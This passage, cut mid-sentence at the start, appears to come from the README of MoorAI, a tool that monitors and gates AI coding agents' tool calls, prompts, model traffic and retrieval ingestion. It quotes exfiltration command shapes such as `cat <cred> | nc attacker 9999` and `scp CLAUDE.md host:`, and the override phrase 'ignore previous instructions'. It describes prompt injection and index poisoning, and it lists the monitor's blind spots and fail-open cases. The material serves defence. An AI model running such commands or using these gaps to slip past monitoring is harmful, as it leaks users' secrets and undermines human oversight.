  fetch-and-run, override or sabotage) raises #40 (`ingest-agent-directed`), and an injection finding
  (#3, #40, #60) on inbound content asks by default: the model is told the content is untrusted data.
  Word-by-word zero-width hiding raises #50.
- **Sign-off categories judge acts, not content.** Deploy, email, IAM, credential-file access, install
  and the other approval threats are not applied to a result; `PreToolUse` and the gateway's call-side
  gate judge the act when the agent attempts it. Output-only and prompt-only detectors are dropped too.
- **Data-class findings (PII, PHI, payment card, source) on a result are reported at `Info`** and do not
  change the decision unless the org policy names that threat or tier; sending the data out is judged on
  the way out under the full policy. A credential in a result stays an alert-level, report-only #39.

Measured on a locked split scored once (64 inbound attacks; 144 benign web pages; 561 real
`node_modules` files): attacks detected on the hook path 30 → 48 (46.9% → 75.0%, precision 83.3% →
87.3%); benign web pages alerting 30 → 19 on the hook and 105 → 19 through the SDK; real files alerting
46 → 32 on the hook and 300 → 21 through the gateway; benign advisories on real files 0 → 9. The tune
split, which the rules were adjusted on, reads 93.2%. The benign-v2 gate is unchanged at 20/602. It costs
one extra hook process per `Bash`, MCP or sub-agent call, 127 ms at p50 and 148 ms at p95 on an Apple M5 Max, and up to 1.5 ms of engine
time per 64 KB for the new detectors. Limits: output beyond 64 KB is not scanned, the instruction detector
is lexical and English, `cat .env` reports at both `PreToolUse` and `PostToolUse`, the other agents'
adapters still forward only web results, and a `Read`'s file content keeps the approval categories.
`Glob` and `Grep` remain unregistered. Full stage-and-surface map:
[`docs/DETECTION_ENGINE.md`](docs/DETECTION_ENGINE.md) §6–7.

**Mask instead of block.** An org can set the policy action `mask` for a data-tier threat (#15 PII, #39
secrets, #1 payment card, #44 PHI), per threat (`threatPolicy`) or per tier (`tierPolicy.secret` / `pii` /
`regulated`). MoorAI then replaces the matched span with `[MOORAI:<tier>:<8 letters>]`, derived from the
keyed content hash so no part of the value survives, re-scans the rewritten text, and lets the call
proceed. It rewrites the `Bash` and `PowerShell` command, `Write`/`Edit`/`NotebookEdit` content, `MultiEdit`'s
`new_string`, the `WebFetch` url and prompt, every MCP argument string and the `Task` prompt through
`PreToolUse` `updatedInput`, sent with no permission decision so a mask never auto-approves a call, and
the seven post-tool results through `PostToolUse` `updatedToolOutput`. Where it cannot rewrite, it falls
back to `policy.maskFallback` (`notify` / `justify` / `block`), else to the action the threat would have
had: a `Read`, the files a shell command reads, the other agents' adapters, Cursor's renamed tools, an
unenrolled device, a mask the re-scan does not confirm, and values over 256 KB. Each mask posts a
content-free `Sensitive span masked` alert. Limits: not yet observed in a live Claude Code session (built
from the hooks reference and the shipped binary); another hook's `updatedToolOutput` can override it,
because the last one wins; the desktop app treats `mask` as report-only; and the console policy editor
may not offer it yet.

**The context an agent auto-loads is screened too.** A detached worker runs the engine's `index` stage
over the files the agent pulls in on its own — `CLAUDE.md`, `AGENTS.md`, `.mcp.json` and their siblings.
On by default, off with `policy.indexScan: false`, and off the hot path so it cannot change a verdict.
`.claude/skills/**` and `.claude/agents/*.md` are **not** in that ingest surface; they are covered by
Skill Analysis on load, below.

**A prompt a person types is their instruction; a prompt an event wrote is inbound content.** The hook
registers `UserPromptSubmit` (existing installs pick it up on the next hook call). Typing "ignore previous
instructions" on your own laptop is not an attack, so a typed prompt is not scanned. A prompt that arrives
any other way can carry a third party's text: Claude Code marks it with a `source` other than `user`
(`sdk`, `system`, `poll_event`, `schedule_wakeup`, `loop_wakeup`), and in server mode every prompt is
whatever the pipeline put there. Under `policy.promptScan: "untrusted"` (default) those prompts are scanned
by the detection engine at the `file` stage as inbound content and reported at stage `prompt`, tool
`hook:UserPromptSubmit`, with `promptOrigin` (`person` / `event` / `server`) and `promptSource`; `"all"`
scans every prompt and `"off"` none. A prompt with no `source` (older Claude Code, the other agents'
adapters) counts as typed. A prompt over 64 KB is scanned up to the cut, which the ledger records.
`policy.promptScanAction` is `"report"` (default; prints nothing, because stdout on this event enters the
model's context) or `"block"`, which blocks the prompt with a reason naming the threats, never quoting it. Only instruction-carrying threats (#2, #3, #21, #22,
#25, #40, #50, #51, #60, #68, #70, #72, #74) or a finding whose configured action is block or kill block;
PII and secrets in an issue body are reported. An unenrolled device never blocks; it shows the user a
`systemMessage`. Measured with `promptScan: "all"`: 21 of 602 benign-v2 prompts flagged (6 would block),
97 of 311 benign web pages flagged (33 would block), 0 of 174 Arabic, 0 of 180 Russian and 16 of 179 Hebrew
benign prompts (13 of them #41); as event prompts, 27 of 45 vector-2 attacks (18 blocked) and 22 of 25
vector-5 attacks (21 blocked). A scanned `poll_event` prompt measures 170 ms at p50 against 128 ms
unscanned; a typed prompt is not scanned (109 ms). Limits: prompt findings do not feed session risk, the
lethal-trifecta check, behaviour logging or model escalation, and the scan has not been observed in a live
Claude Code session. Reports are content-free even under `full-capture`.

**The prompt also states the task, for intent alignment.** From prompts a person wrote (machine-injected
`system` and `poll_event` turns are skipped) the hook stores HMACs, under a device key in
`~/.moorai/intent.key`, of the sites, paths, service names and labels the prompt mentions, in `~/.moorai/intent-alignment.json` (both 0600; 64
sessions, 24 h, 512 features). Only calls that are already risky are judged: a `Bash` or `PowerShell`
upload to a non-loopback host (a UNC share counts as its host), a #43 destructive command, a #55 credential read, an MCP tool whose name is a write.
An upload is aligned only if every destination site was named; a label never excuses one. A session
with no captured task is never judged. A misaligned call posts one content-free alert per session,
class and target (#64, `Action outside the stated task`, counts only). `policy.intentAlignment` is
`"report"` (default), `"ask"` (opt-in; raises an allow to ask) or `"off"`; an unenrolled device coaches.
With `modelEscalation` and `semanticEscalation` both on, the loopback model also labels the prompt at
capture time, bounded by `MOORAI_INTENT_TIMEOUT_MS` (default 1500). Limits: it is lexical, not semantic,
so an upload to a host the user named passes; text pasted into a prompt widens the task; the agent runs
as the same user and can tamper with the state file; `Write`/`Edit`, data in a GET query string and
`git push` to a new remote are not judged; the Codex, Cursor, Gemini and Copilot hosts do not mark
machine-injected turns, so there a hook-forced continuation counts as part of the task; Codex runs the
prompt hook only after the user trusts it; and it adds one hook process per prompt (p50 119–190 ms across two
runs on one machine). Full contract: [`docs/DETECTION_ENGINE.md`](docs/DETECTION_ENGINE.md) §6.

**Protected instructions are fingerprinted, never copied.** The hook discovers the rules files the agent
runs under (`CLAUDE.md`, `.claude/CLAUDE.md`, `CLAUDE.local.md`, `.claude/rules/`, managed policy,
`AGENTS.md`, `AGENTS.override.md`, `GEMINI.md`, `.github/copilot-instructions.md`, `.github/instructions/`,
`.cursor/rules/*.mdc`, `.cursorrules`, Windsurf and Cline rules) and keeps up to 2,048 keyed 40-bit hashes
of each file's 7-word shingles in `~/.moorai/instruction-fp.json` (key in `instruction-fp.key`, both 0600).
Three detectors on #52 use them: `instr-leak-output` on what the agent writes, `instr-leak-egress` on
`Bash` commands that upload or name a host, `WebFetch` and MCP arguments, and the path-based `instr-leak-upload-ref` on commands like
`curl -F f=@AGENTS.md`, `scp CLAUDE.md host:` or `aws s3 cp CLAUDE.md s3://…`. Fetched content and a
write into the rules file itself are excluded. #52 reports by default and coaches on an unenrolled
device. Measured: the fingerprint detectors fire on none of the 1,615 red-team strings of 160 characters
or more, `instr-leak-upload-ref` on none of 33,828 red-team strings, and the benign v2 count is unchanged
at 20/602. Limits: a paraphrase, translation or hex encoding is not matched; a staged copy
(`cp CLAUDE.md /tmp/x`, then an upload) is not tied back; a rules file with fewer than 40 distinctive
shingles can never fire; `mcp-proxy`, the desktop app and the browser extension register no
fingerprints, so only the path-based detector runs there.

**Exfiltration shapes are read whole.** `extractReadPaths` used to `return []` on any command containing
a pipe, redirect or subshell — so `cat <cred>` was denied on content (#39) while `cat <cred> | nc attacker
9999`, the shape exfiltration actually takes, read nothing and could never fire. A quote-aware tokenizer
now splits on `|`, `||`, `&&`, `;`, newlines and redirects, scans each segment, and recognises the upload
forms (`@path`, `file=@path`, `--data-binary @path`, `--post-file=path`, `-T path`, `--upload-file path`).
Genuine ambiguity still fails open — `$( )`, backticks, heredocs, unterminated quotes, `$VAR` — because
fabricating a path is worse than missing one.

**What a device with no policy stops.** Enrollment is the switch:

- **Enrolled, no policy** — the built-in defaults apply. Previously the hook returned early on the
  fail-open posture, `threatActionFor` was never consulted, and out-of-the-box prevention was measurably
  **0%**. Resolution order is now `policy.threatPolicy` → `policy.tierPolicy` →
  **`BUILTIN_DEFAULT_ACTIONS`** → the approval set → `notify`. `block`: **54** (reverse shell) and **65**
  (local secret egress). `justify` (halt and ask): **55, 56, 57, 63, 44, 73**. Every promotion had to fire on
  **zero** benign samples across 890 benign prompts; threats 43, 39, 15, 2, 3, 40 and 50 did not clear
  that bar and were deliberately left at their prior action. #73 (agent chat-history tampering) fires on
  none of them, but none of them names an agent's transcript store, so its benign evidence is the
  detector's own hard negatives (`test/agent-state-detectors.test.mjs`).
- **One documented exception** — on the **write path only**, threat 65 resolves to `justify`/ask rather
  than `block`, because copying `.env` → `.env.local` is routine work and no benign corpus measures it.
- **Unenrolled** — coaches. The same built-in defaults run; where they would deny or ask, the hook
  instead shows the developer — and hands the agent — the category it caught and the safer alternative,
  and the call goes on to the host's normal permission flow. Nothing is blocked, held for sign-off or
  killed, and nothing is posted. The rule lives in one place, `data/enforcement.js`, used by the hook,
  the Codex / Copilot / Gemini / Cursor adapters, the `claude -p` guard, the Claude Desktop MCP proxy
  and the desktop app. A device under a fail-closed posture (MDM latch or `MOORAI_OFFLINE_MODE`) keeps
  enforcing without a token, so removing the token is not a way out of an org's policy. So does a
  hook in server mode (below).
- **Enrolled** — an org policy wins in both directions: a tenant can soften any built-in default or
  harden a threat the map omits.

### Server mode (CI, containers, Agent SDK)

For agents that run without a developer's laptop: `claude -p` in CI, the Claude Code GitHub Action, an
Agent SDK service in a container. The Agent SDK runs shell command hooks from settings files under its
default `settingSources`, so the same hook runs there. Server mode is on when the root-owned
`/etc/moorai/config.json` (Windows: `%ProgramData%\MoorAI\config.json`) says `"mode": "server"` or the
environment sets `MOORAI_MODE=server`; with it off, the hook behaves exactly as on a laptop. The module is
[`cli/server-mode.mjs`](cli/server-mode.mjs); a Dockerfile, a GitHub Actions workflow and a managed-settings
writer are in [`examples/server/`](examples/server/README.md).

- **Where the binding comes from.** Per key, highest first: the system file (read only when root-owned
  and not group- or world-writable), the environment (`MOORAI_SERVER_URL`, `MOORAI_TENANT`,
  `MOORAI_INSTALL_TOKEN`, `MOORAI_SERVICE_ID`), `~/.moorai/config.json`, then the defaults
  (`http://localhost:8787`, tenant `unprovisioned`, no token).
- **A settings file cannot set it.** Claude Code applies a settings file's `env` block to the hook's
  environment, and in a `-p` run it does so with no trust dialog, so a pull request's
  `.claude/settings.json` could otherwise point the hook at another console. A `MOORAI_*` name (or one of
  `GITHUB_ACTIONS`, `GITHUB_REPOSITORY`, `GITHUB_WORKFLOW`, `GITHUB_JOB`) that a user, project or local
  settings file sets in its `env` block is refused for server mode's own settings and reported as
  tampering: a Critical content-free alert, `Server-mode configuration refused (set by a settings file)`,
  carrying the names only. A managed settings `env` block is trusted.
- **"Ask" has no one to answer it.** A verdict that would hold for sign-off is denied, with a reason saying
  this is a headless run and no approver exists, and one content-free alert records it
  (`Headless approval denied (no approver)`). `"headlessAsk": "allow-with-report"` in the system file or
  the org policy lets the call through and reports it instead; `MOORAI_HEADLESS_ASK` can only say `deny`.
- **Bypass mode, on any enrolled device.** When Claude Code runs with `--dangerously-skip-permissions`
  (`permission_mode: "bypassPermissions"`), a verdict that would hold for sign-off is denied with a reason
  saying permission prompts are bypassed, and one content-free alert records it (`Approval denied
  (permission prompts bypassed)`, reason code `BYPASS_ASK`). A hard deny holds in every mode; an unenrolled
  device still coaches. Measured: `claude -p` in bypass mode already refuses a hook's ask; the deny makes
  the outcome MoorAI's own in interactive bypass sessions too, where Claude Code's handling of a hook ask is
  not documented.
- **The actor is the workload.** `MOORAI_SERVICE_ID` names it; on GitHub Actions without it the name is
  `github:<repository>:<workflow>:<job>` (the run id is left out, so every run of a job is one workload);
  otherwise `unnamed`. `service` / `svc:<name>` is hashed into the actor exactly as `user@host` is on a
  laptop, so a redeployed container keeps its console pseudonym.
- **It enforces without a token.** Server mode counts as management, like a fail-closed posture, so
  nothing coaches. With no token the built-in defaults enforce, but nothing is reported and no org policy
  is fetched.
- **`moorai-doctor`** shows where each part of the binding came from (the token as a sha256 fingerprint),
  what a "justify" verdict becomes, the workload identity and any refused name, and its self-test adds a
  credential read to show the headless answer. It warns when there is no token, no workload name, no
  policy trust anchor (a container discards the TOFU key pin between runs, so ship
  `/etc/moorai/policy.pub` or `MOORAI_POLICY_PUBKEY`), or an `http` console that is not loopback.

The example [`Dockerfile`](examples/server/Dockerfile) registers the hooks in Claude Code's managed
settings (`/etc/claude-code/managed-settings.json`), which a repository the agent works on cannot switch
off. The desktop app, the AI bill of materials, the shadow-AI inventory and OS posture do not apply on a
server. Proof: one live run of Claude Code 2.1.284 (`claude -p`, the hooks added with `--settings`, server mode from the environment) showed UserPromptSubmit (117 ms) and PreToolUse (224 ms) firing, a `.env` read denied as a headless ask, and the console receiving content-free reports under the workload identity. An Agent SDK service and a GitHub Actions run have not been watched end to end. An Agent
SDK service can also run MoorAI in process, below.

**Settings files cannot set MoorAI's trust anchors.** Claude Code applies a settings file's `env` block to the
hook's environment, so a repository's `.claude/settings.json` could otherwise supply `MOORAI_BREAKGLASS_PUBKEY`,
`MOORAI_POLICY_PUBKEY`, `MOORAI_OFFLINE_MODE` or the OTLP export endpoint. On every device, laptop or server, a
value that a user, project or local settings file sets for one of those is ignored and reported to the console
(names only); a managed settings value, the launching environment and the root-owned anchor files are trusted.

### Server mode: Agent SDK and sidecar

The shell hook costs one process per tool call (p50 152–159 ms, p95 170–178 ms across runs on an Apple M5 Max, of which 38–39 ms is Node startup; [`docs/BENCHMARK.md`](docs/BENCHMARK.md)). Two long-lived forms run the same
engine, policy and server-mode semantics (a headless ask is denied, the actor is the workload, reports are
content-free) in one process:

- **`@moorai/agent-sdk`** ([`packages/agent-sdk`](packages/agent-sdk/src/index.mjs)) returns the `hooks`
  record for the Claude Agent SDK's `query()`:

  ```js
  import { query } from "@anthropic-ai/claude-agent-sdk";
  import { moorAIHooks } from "@moorai/agent-sdk";
  for await (const m of query({ prompt, options: { hooks: moorAIHooks({ serviceId: "invoice-agent" }) } })) …
  ```

  `PreToolUse` returns the hook's own decision and reason: a parity test over 214 payloads under two policy
  states found 0 mismatches. Prompts and tool results are observed by default (scanned and reported);
  `prompts: "enforce"` blocks a denied prompt and `toolResults: "advise"` tells the model a flagged result
  is untrusted data. p50 is 1.99 ms per `PreToolUse` on a 2 KB input.
- **`moorai-serve`** ([`cli/moorai-serve.mjs`](cli/moorai-serve.mjs)) is a localhost sidecar for agent
  loops that are not Claude Code or the Agent SDK (OpenAI Agents SDK, LangGraph, CrewAI, a custom loop):
  `POST /v1/scan` (`{text, stage?, ctx?}`), `POST /v1/tool-call` (`{tool, input, cwd?}`, the decision the hook
  makes for that call), `POST /v1/index-scan` (`{chunks, source?}`, one verdict per chunk about to be
  embedded; see below) and `GET /healthz`. Each POST also takes an optional `session` (the caller's own
  session id), which leaves only as the keyed `session` field of the alerts it raises. Verdicts never contain the submitted text, though a
  `tool-call` verdict's `message`, the sentence the hook shows the agent, can name a file or a host from
  the call. It binds loopback
  only unless `--allow-remote` is given with a token of 16+ characters (`--token-file` or
  `MOORAI_SERVE_TOKEN`, sent as a bearer token and compared in constant time). It rejects a non-loopback
  `Host` (421), a body that is not JSON (415) and a body over 1 MiB (413, after draining it), with a 5 s
  header timeout and at most 256 connections. p50 for `/v1/scan` on 2 KB is 6.4–11 ms. A stdlib-only
  Python client with LangGraph and CrewAI examples is in [`clients/python`](clients/python/README.md),
  which also maps a framework's tools onto the hook's tool names.

Not evaluated in process, and listed in each result's `notEvaluated`: the circuit breaker, session risk,
deletion volume, intent alignment, learned drift, MCP reputation, model escalation, honeytokens and the
`mask` rewrite. The SDK's `PostToolUse` observes by default and resolves a result under the same inbound
rules as the hook (`cli/inbound.mjs`); `/v1/scan` with `ctx.inbound` does too, and accepts the tool's raw
`result` (any JSON) in place of `text`.
`/v1/tool-call` reads paths on the sidecar's own filesystem, so an authenticated client can learn whether
a file there holds secrets; run it where the agent's files are. The secret-egress fingerprint cache is
filled once per directory for the life of the process. The Python examples have not been executed.
Declared workload profiles are evaluated in process, with the `serviceId` option (else the server-mode
workload name) as the name a profile matches.

#### Content headed for an index (RAG ingestion)

A poisoned document in a retrieval index is read back into some later user's context with no tool call
and nobody typing it. MoorAI scans a chunk at the engine's `index` stage (the prompt detectors plus the
ingested-content ones: untrusted directives, agent-addressed text, hidden canaries, tool poisoning,
AI-only cloaking) before it is embedded, through `DetectionEngine.scanForIndex` and the same policy as
every other surface (`cli/index-scan.mjs`).

```js
import { scanBeforeEmbed, guardEmbed } from "@moorai/agent-sdk";
const report = await scanBeforeEmbed(chunks, { source: "kb/handbook" });  // { action, results: [{ index, verdict, threatIds, reasons }], allowed, flagged, denied }
const addDocs = guardEmbed((docs) => vectorStore.addDocuments(docs), { source: "kb/handbook" });
await addDocs(docs);   // under policy "block", denied documents never reach addDocuments
```

```bash
curl -s localhost:8790/v1/index-scan -H 'content-type: application/json' -d '{"chunks":["…","…"],"source":"kb/handbook"}'
```

Each chunk gets `allow` (no finding), `flag` (reported, kept) or `deny`. `policy.indexScanAction` is
`"report"` (default: nothing is dropped) or `"block"`: a chunk is denied when a finding is an
instruction-carrying threat (the `promptScanAction` list) or one whose configured action is block or kill.
A chunk is a string or an object whose string values are scanned (a LangChain `Document`'s `pageContent`
and `metadata`), up to 256 KB each and 4,096 per call. Alerts are content-free (stage `index`, tool
`index:embed`, a keyed hash of the matched span, and the `source` only as a keyed hash); the verdicts never
carry chunk text. Fail-open: an internal error keeps every chunk unless `failClosed: true`.

The MCP proxy and gateway recognise **vector-store write tools** and scan their arguments at the same stage
before forwarding the call: a tool named in `policy.indexTools` (`"add_documents"`, or `"chroma/upsert"`
for one server), or, unless `policy.indexToolHeuristic: false`, the write tool of a verified server (below)
or a name with a write verb (`add`, `upsert`,
`insert`, `index`, `store`, `ingest`, `embed`, `save`, `remember`) plus a store noun (`documents`,
`memory`, `vectors`, `chunks`, …), a vector-store hint in the tool or server name (`chroma`, `qdrant`,
`pinecone`, `weaviate`, `milvus`, `mem0`, …) or a `documents` / `texts` / `chunks` array argument. A name
that also says get, list, query, search or delete is not a write, nor is one that creates an index. Under
`"block"` the call is refused before the server sees it (`MCP: blocked vector-store write`).

The write tools of these MCP servers are recognised by exact name, whatever the server is labelled. The
names were read from each server's source on 2026-10-07; none was run. Repos, commits and the argument
that carries the text: "Vector-store writes" in [`mcp-proxy/README.md`](mcp-proxy/README.md).

| Server | Write tools |
|---|---|
| Chroma | `chroma_add_documents`, `chroma_update_documents` |
| Qdrant | `qdrant-store` |
| Pinecone | `upsert-records` |
| Weaviate | `weaviate-insert-one`, `weaviate-objects-upsert` |
| mem0 / OpenMemory | `add_memory`, `update_memory` / `add_memories` |
| Milvus | `milvus_insert_data` |
| OpenSearch | `SaveMemoryTool`, `AddAgenticMemoriesTool`, `UpdateAgenticMemoryTool`, `CreateAgenticMemorySessionTool`, and `GenericOpenSearchApiTool` for a document write (`POST` / `PUT` / `PATCH` to `_doc`, `_create`, `_update`, `_bulk`) |
| Redis | `set_vector_in_hash` (plain key-value writes are not index writes) |
| LanceDB | `ingest_docs` |
| MCP reference `memory` (knowledge graph) | `create_entities`, `create_relations`, `add_observations` |
| Elasticsearch | none: its MCP server has no write tool |

**Covered:** an application that calls `scanBeforeEmbed` / `guardEmbed` or `/v1/index-scan`, and MCP
vector-store write tools that match the rule above. **Not covered:** an application that embeds without
calling MoorAI, an in-process vector library (a FAISS or Chroma client inside the app) with no MCP or API
hook, a vector-store tool whose name and arguments match nothing (name it in `policy.indexTools`), and
documents a vector store ingests on its own (a crawler, a bulk import). Dropping a chunk changes the array
the embed function receives; use `onReport` to drop the same ids.

#### Model proxy

`moorai-model-proxy` ([`model-proxy/`](model-proxy/README.md)) sits between an agent's model SDK and the
provider, for any agent loop that calls Anthropic or OpenAI through their SDKs. It listens on 127.0.0.1:8791 with two routes,
`/anthropic` (Messages API) and `/openai` (Chat Completions); the agent points its SDK's base URL at it:

    moorai-model-proxy                                   # report-only
    ANTHROPIC_BASE_URL=http://127.0.0.1:8791/anthropic   your-agent
    OPENAI_BASE_URL=http://127.0.0.1:8791/openai         your-agent

It scans what the agent sends (prompt and system text at stage `prompt`; tool results and documents fed
back at stage `output` as inbound content, where indirect injection shows up; a re-sent item is
scanned once, through a bounded cache) and decides each tool call the model returns as `/v1/tool-call` would. The client's own API
key and headers go upstream untouched and are never logged, stored or reported. Alerts use surface
`model-proxy` with the existing reason codes and are content-free.

**Placeholder credentials** (`--credentials <file>`, opt-in). The agent holds `moorai-ph:<name>` instead
of the key. The proxy, running as another user or in another container, swaps in the real key only on the
route the placeholder is bound to. Any other use of a placeholder is refused, and a key the upstream echoes
back is masked. A raw key in a credential header or in the `?key=` query string (the Gemini API's
query-string auth) is alerted once per route, and refused with `--require-placeholders`. The same mechanism
is in `moorai-mcp-gateway`. It does not protect a key the agent can read itself, or one it uses on any other
path. The agent can still use the placeholder through the proxy, so
policy decides what goes through. See [`model-proxy/README.md`](model-proxy/README.md#placeholder-credentials).

**Tool calls in responses: withhold instead of refuse, local models, the skip alert.** Every tool call the
model returns is decided by the same function `/v1/tool-call` calls, before the framework receives it.
`--mode enforce --denied-tool-call replace` delivers a turn with a denied call as text instead of an error.
Every tool call of that turn is withheld, and the turn ends with `stop_reason: end_turn` /
`finish_reason: stop`, streaming or not. An OpenAI-compatible local server (Ollama, LM Studio, llama.cpp,
vLLM) is a `--route` to its loopback `/v1`.

**Gemini.** `generateContent` and `streamGenerateContent` (JSON, the JSON array sent without `alt=sse`, and
SSE with `alt=sse`) are parsed on any route, chosen by the `…/models/<model>:generateContent` path, so the
Gemini API and Vertex AI publisher-model endpoints are both covered. There is no default Gemini route: add
`--route /gemini=https://generativelanguage.googleapis.com` (listing the other routes too, since `--route`
replaces the defaults) and set `GOOGLE_GEMINI_BASE_URL=http://127.0.0.1:8791/gemini`, which the Google Gen
AI SDKs read. Each `functionCall` part is judged like any other tool call; prompts, system instructions and
`functionResponse` parts are scanned. A denied call is refused (403, or a bare `{"error":…}` object that
ends the stream, which both Gen AI SDKs raise) or, with `replace`, becomes one text part with
`finishReason: "STOP"`. Vertex's streamed `partialArgs` have no documented assembly rule and are refused in
enforce mode. Tested against a fake Gemini upstream only. `--unchecked-window-ms` with `moorai-serve --model-proxy-url`
alerts, content-free, on a forwarded call that the framework never checked with its `toolCallId`. This
judging covers only Anthropic Messages, Chat Completions and Gemini `generateContent` traffic that goes
through the proxy. The Responses API, Bedrock, Gemini's Interactions and Live APIs and Vertex partner models
are forwarded unparsed. See
[`model-proxy/README.md`](model-proxy/README.md#exact-coverage-of-tool-call-judging).

- **Report-only by default.** Bytes are forwarded as received and streaming is fully pass-through; the
  checks run after the response is delivered. An alert whose configured outcome would block is stamped
  `enforcement: LIMITED`. Added p50 latency is about 0 ms; the one event loop scans about 2 KB of new
  content in 10 ms, which bounds throughput, not latency.
- **`--mode enforce`** refuses a denied request with HTTP 403 in the provider's own error shape (Anthropic
  `permission_error`, OpenAI `moorai_policy_denied`) before the provider sees it, refuses content it
  could not fully evaluate (past `--max-scan-items` / `--max-scan-chars`, a compressed response, an SSE
  event over 1 MiB), and withholds a denied tool call: a non-streaming response is refused whole, and in a
  stream the tool call's events are held until it is complete, then released byte-identical or replaced by
  the provider's error event. An "ask" follows server mode's headless rule.
  Response-side enforcement (withholding a denied tool call, streaming and non-streaming, Anthropic and OpenAI shapes, including truncated streams, arguments that are not a JSON object and a dropped upstream connection) is tested against a fake provider; it has not been run with the real SDKs or a real provider. In Anthropic streams a tool call is held one block at a time, so an allowed call that comes before a denied one in the same turn has already been released when the turn is refused.

Limits: the agent must use a plain `http://127.0.0.1` base URL, because the proxy does not intercept TLS
(an SDK pinned to the provider's HTTPS URL bypasses it). Only `POST …/messages` and
`POST …/chat/completions` are parsed; the OpenAI Responses API, embeddings, `count_tokens`, Bedrock and
Vertex are forwarded unchecked. Assistant turns, images, base64 PDFs, tool definitions and server-side tool
blocks are not scanned. It has been tested against a fake provider and a fake console, not with the real
SDKs or a real provider.

#### Claude Enterprise Inference hooks

`moorai-inference-hook` ([`cli/moorai-inference-hook.mjs`](cli/moorai-inference-hook.mjs)) is an AI
security server for [Inference hooks](https://platform.claude.com/docs/en/manage-claude/inference-hooks),
a Claude Enterprise beta. Once an Owner turns the feature on, Anthropic POSTs each governed prompt from
claude.ai, Claude Code and Cowork to the organization's server, and with **Validate tool calls** on, each
tool call frame as well. Anthropic holds the request until the server answers allow or deny. Requests are
signed per Standard Webhooks.

    moorai-inference-hook serve --secret-file /etc/moorai/inference-hook.secret     # 127.0.0.1:8792
    moorai-inference-hook test  --url https://hooks.example.com/moorai --secret-file …

- **Verification.** The signature (`webhook-id`, `webhook-timestamp`, `webhook-signature`, HMAC-SHA256
  over the raw body) is checked in constant time against every configured secret. A secret file may hold
  the previous and the current `whsec_` secret during a rotation. A timestamp more than five minutes off
  is rejected, and so is a `webhook-id` already accepted inside its window (401 / 409). The secret comes
  from `--secret-file` or `MOORAI_INFERENCE_HOOK_SECRET`, never from a command-line value.
- **Judging.** The verdict comes from the MoorAI runtime that `moorai-serve` uses: the verified console
  policy, the root-owned system config, and server mode's headless rule (an "ask" becomes a deny unless
  `--headless-ask allow-with-report`). User text is judged at stage `prompt`, tool results at `output` as
  inbound content, and attachment text at `file`. A tool call frame is judged by content only: the shell
  command, the URL, or else the argument JSON. The tool runs on the user's machine, so the server never
  reads a path a tool call names. Each item is judged once per conversation. The answer is HTTP 200 with
  `{"action":"allow"}` or `{"action":"deny","deny_reason":…,"reference_id":…}`. The deny reason names
  threat ids and categories, never the content. An unknown event type gets allow, as the protocol requires.
- **When it cannot judge** (an item past the scan cap, `--eval-timeout-ms`, an engine error), `--fail`
  decides. `open`, the default, answers allow, which matches Anthropic's default failure handling,
  "Allow the request". `closed` answers deny. A body it cannot read (over `--max-body` or the in-flight
  budget) cannot be authenticated. `closed` answers deny, and `open` returns 413 / 503, which leaves the
  outcome to Anthropic's failure handling.
- **`--shadow`** always answers allow. A would-be deny is reported with `enforcement: LIMITED`. Anthropic's
  own shadow mode is a separate setting in the admin console.
- **Alerts** are content-free and use surface `inference-hook` with tool label `inference-hook:<kind>`.
  Each carries `inferenceRef`, the `reference_id` returned to Anthropic, which joins to the Activity Feed's
  `inference_hooks_request_denied` record, and `inferenceSource`, which is `source.application`. When the
  frame has a `session_id`, alerts also carry `session`, its keyed hash. The transcript, email addresses
  and actor ids are never sent.
- **Exposure.** The server binds 127.0.0.1 by default. Anthropic only calls an `https://` URL on port 443
  with a publicly trusted certificate, so TLS is terminated by a reverse proxy on the same host. A
  non-loopback bind needs `--allow-remote`. `--max-body` defaults to 64 MiB, the protocol's maximum, and
  there are limits on header time, request time and connections.

Limits: it has been tested only against signed sample frames built from Anthropic's published schema,
not against Anthropic's live service. Tool calls are judged by content only: a Read of a credential file,
MCP file arguments and local secret egress are not judged, because those files are not on this server.
Field names may change during the beta.

#### Container image and sidecars

`ghcr.io/gitayg/moorai-server` runs `moorai-serve` by default and `moorai-mcp-gateway` or
`moorai-model-proxy` as alternative commands ([`docker/server/Dockerfile`](docker/server/Dockerfile)). It is `node:22-slim` plus the files the
npm package ships (about 350 MB), runs as uid 1000 (`node`), installs no npm dependencies and sets
`MOORAI_MODE=server`. [`.github/workflows/publish-server-image.yml`](.github/workflows/publish-server-image.yml)
builds it for amd64 and arm64 on each release tag and pushes `:<version>`, `:latest` and `:sha-<short>`,
after checking that the tag matches `package.json`; it then fails the run if the image holds a secret file
or runs as root.

    docker run --rm ghcr.io/gitayg/moorai-server:<version>                       # moorai-serve, 127.0.0.1:8790
    docker run --rm ghcr.io/gitayg/moorai-server:<version> moorai-mcp-gateway --route /github=https://api.githubcopilot.com/mcp/
    docker run --rm -e MOORAI_HEALTH_PORT=8791 ghcr.io/gitayg/moorai-server:<version> moorai-model-proxy   # report-only, 127.0.0.1:8791

All three bind loopback, so run the sidecar in the agent's network namespace: a second container in the same
Kubernetes pod, or a compose service with `network_mode: "service:<agent>"`. Use exec probes
(`node /opt/moorai/docker/healthcheck.mjs`, which the image's `HEALTHCHECK` also runs), not `httpGet`: the
kubelet probes the pod IP, where nothing listens, and `moorai-serve` and the model proxy answer 421 to a
non-loopback `Host` (the gateway answers 403). For the gateway, set `MOORAI_HEALTH_PORT=8848` and
`MOORAI_HEALTH_PATH=/`; for the model proxy, `MOORAI_HEALTH_PORT=8791` (its `/healthz`). Console
binding (`MOORAI_SERVER_URL`, `MOORAI_TENANT`, `MOORAI_INSTALL_TOKEN` from a Secret) and the workload name
(`MOORAI_SERVICE_ID`) come from the environment, never from the image. With a read-only root filesystem,
give `/home/node` (the policy cache) and `/tmp` a writable `emptyDir` or `tmpfs`.
[`examples/serve/`](examples/serve/README.md) has a Kubernetes manifest with both sidecars and a compose
demo.

**Workload identity on alerts.** Alerts from the sidecar, the gateway, the model proxy, `@moorai/agent-sdk`
and the hook in server mode carry a `workload` object ([`cli/server-mode.mjs`](cli/server-mode.mjs) `workloadIdentity`):

    "workload": { "containerId": "<64 hex>", "pod": "billing-agent-7d9f", "namespace": "prod", "node": "node-a", "pid": 4242 }

- `containerId` is the container the verdict is about, from `/proc/self/cgroup`, else from the
  `/etc/hostname`, `/etc/hosts` or `/etc/resolv.conf` bind mount in `/proc/self/mountinfo`. Those mounts
  belong to the network namespace, so a sidecar that shares the agent's namespace reports the agent's
  container (measured with the compose demo: the alert's id is the agent container's, not the sidecar's).
